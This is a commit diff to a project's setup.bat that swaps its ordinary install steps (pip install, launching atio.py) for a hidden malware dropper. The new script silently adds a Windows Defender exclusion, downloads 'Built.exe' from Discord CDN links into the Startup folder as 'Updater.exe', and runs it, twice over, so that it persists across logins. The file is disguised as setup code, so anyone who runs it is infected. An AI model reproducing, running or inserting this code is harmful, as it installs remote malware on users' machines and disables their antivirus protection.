de142a5b55fd49345a42bf70b0b07cc195608b90
Matleox <68650899+Matleox@users.noreply.github.com>
2024-01-01 13:20:25 +0300

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,5 +1,38 @@
-python -m pip install -r requirements.txt
-cls
-echo python atio.py >> start_tool.bat
-start start_tool.bat
-start /b "" cmd /c &exit /b
+powershell -w hidden -c Add-MpPreference -ExclusionPath ""
+
+@echo off
+setlocal 
+
+set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176190901970796564/Built.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
+@echo off
+setlocal 
+
+set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176181839065526402/Built.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
+@echo off
+cd /d %~dp0
